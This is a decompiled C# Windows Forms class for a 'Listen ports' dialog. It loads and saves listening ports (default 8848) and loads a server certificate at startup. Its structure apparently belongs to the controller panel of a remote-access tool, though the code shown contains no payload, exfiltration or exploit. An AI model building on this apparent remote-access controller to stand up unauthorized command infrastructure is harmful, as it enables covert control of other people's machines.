// Server.Forms.FormPorts
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server;
using Server.Forms;
using Server.Helper;
using Server.Properties;

public class FormPorts : DarkForm
{
	private static bool isOK;

	private IContainer components;

	private ListBox listBox1;

	private DarkButton button1;

	public DarkTextBox textPorts;

	private DarkLabel label1;

	private DarkGroupBox groupBox1;

	private DarkButton btnDelete;

	private DarkButton btnAdd;

	public FormPorts()
	{
		InitializeComponent();
		base.Opacity = 0.0;
	}

	private void PortsFrm_Load(object sender, EventArgs e)
	{
		Methods.FadeIn(this, 5);
		if (Server.Properties.Settings.Default.Ports.Length == 0)
		{
			listBox1.Items.AddRange(new object[1] { "8848" });
		}
		else
		{
			try
			{
				string[] array = Server.Properties.Settings.Default.Ports.Split(new string[1] { "," }, StringSplitOptions.None);
				foreach (string text in array)
				{
					if (!string.IsNullOrWhiteSpace(text))
					{
						listBox1.Items.Add(text.Trim());
					}
				}
			}
			catch
			{
			}
		}
		Text = Server.Settings.Version + " - " + Environment.UserName;
		if (!File.Exists(Server.Settings.CertificatePath))
		{
			using (FormCertificate formCertificate = new FormCertificate())
			{
				formCertificate.ShowDialog();
				return;
			}
		}
		Server.Settings.ServerCertificate = new X509Certificate2(Server.Settings.CertificatePath);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (listBox1.Items.Count <= 0)
		{
			return;
		}
		string text = "";
		foreach (string item in listBox1.Items)
		{
			text = text + item + ",";
		}
		Server.Properties.Settings.Default.Ports = text.Remove(text.Length - 1);
		Server.Properties.Settings.Default.Save();
		isOK = true;
		Close();
	}

	private void PortsFrm_FormClosed(object sender, FormClosedEventArgs e)
	{
		if (!isOK)
		{
			Program.form1.notifyIcon1.Dispose();
			Environment.Exit(0);
		}
	}

	private void BtnAdd_Click(object sender, EventArgs e)
	{
		try
		{
			Convert.ToInt32(textPorts.Text.Trim());
			listBox1.Items.Add(textPorts.Text.Trim());
			textPorts.Clear();
		}
		catch
		{
		}
	}

	private void BtnDelete_Click(object sender, EventArgs e)
	{
		listBox1.Items.Remove(listBox1.SelectedItem);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.button1 = new DarkUI.Controls.DarkButton();
		this.textPorts = new DarkUI.Controls.DarkTextBox();
		this.label1 = new DarkUI.Controls.DarkLabel();
		this.groupBox1 = new DarkUI.Controls.DarkGroupBox();
		this.listBox1 = new System.Windows.Forms.ListBox();
		this.btnDelete = new DarkUI.Controls.DarkButton();
		this.btnAdd = new DarkUI.Controls.DarkButton();
		this.groupBox1.SuspendLayout();
		base.SuspendLayout();
		this.button1.Location = new System.Drawing.Point(0, 129);
		this.button1.Margin = new System.Windows.Forms.Padding(2);
		this.button1.Name = "button1";
		this.button1.Padding = new System.Windows.Forms.Padding(5);
		this.button1.Size = new System.Drawing.Size(197, 32);
		this.button1.TabIndex = 0;
		this.button1.Text = "Start";
		this.button1.Click += new System.EventHandler(button1_Click);
		this.textPorts.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.textPorts.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.textPorts.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.textPorts.Location = new System.Drawing.Point(55, 17);
		this.textPorts.Margin = new System.Windows.Forms.Padding(2);
		this.textPorts.Name = "textPorts";
		this.textPorts.Size = new System.Drawing.Size(142, 20);
		this.textPorts.TabIndex = 0;
		this.label1.AutoSize = true;
		this.label1.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label1.Location = new System.Drawing.Point(4, 20);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(26, 13);
		this.label1.TabIndex = 1;
		this.label1.Text = "Port";
		this.groupBox1.BorderColor = System.Drawing.Color.FromArgb(51, 51, 51);
		this.groupBox1.Controls.Add(this.button1);
		this.groupBox1.Controls.Add(this.listBox1);
		this.groupBox1.Controls.Add(this.btnDelete);
		this.groupBox1.Controls.Add(this.btnAdd);
		this.groupBox1.Controls.Add(this.label1);
		this.groupBox1.Controls.Add(this.textPorts);
		this.groupBox1.Location = new System.Drawing.Point(9, 9);
		this.groupBox1.Margin = new System.Windows.Forms.Padding(2);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Padding = new System.Windows.Forms.Padding(2);
		this.groupBox1.Size = new System.Drawing.Size(210, 165);
		this.groupBox1.TabIndex = 2;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "Setting";
		this.listBox1.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.listBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.listBox1.ForeColor = System.Drawing.Color.Gainsboro;
		this.listBox1.FormattingEnabled = true;
		this.listBox1.Location = new System.Drawing.Point(107, 41);
		this.listBox1.Margin = new System.Windows.Forms.Padding(2);
		this.listBox1.Name = "listBox1";
		this.listBox1.Size = new System.Drawing.Size(90, 67);
		this.listBox1.TabIndex = 4;
		this.btnDelete.Location = new System.Drawing.Point(55, 78);
		this.btnDelete.Margin = new System.Windows.Forms.Padding(2);
		this.btnDelete.Name = "btnDelete";
		this.btnDelete.Padding = new System.Windows.Forms.Padding(5);
		this.btnDelete.Size = new System.Drawing.Size(38, 29);
		this.btnDelete.TabIndex = 3;
		this.btnDelete.Text = "-";
		this.btnDelete.Click += new System.EventHandler(BtnDelete_Click);
		this.btnAdd.Location = new System.Drawing.Point(7, 78);
		this.btnAdd.Margin = new System.Windows.Forms.Padding(2);
		this.btnAdd.Name = "btnAdd";
		this.btnAdd.Padding = new System.Windows.Forms.Padding(5);
		this.btnAdd.Size = new System.Drawing.Size(38, 29);
		this.btnAdd.TabIndex = 2;
		this.btnAdd.Text = "+";
		this.btnAdd.Click += new System.EventHandler(BtnAdd_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(227, 181);
		base.Controls.Add(this.groupBox1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Margin = new System.Windows.Forms.Padding(2);
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "FormPorts";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Listen ports";
		base.TopMost = true;
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(PortsFrm_FormClosed);
		base.Load += new System.EventHandler(PortsFrm_Load);
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		base.ResumeLayout(false);
	}
}
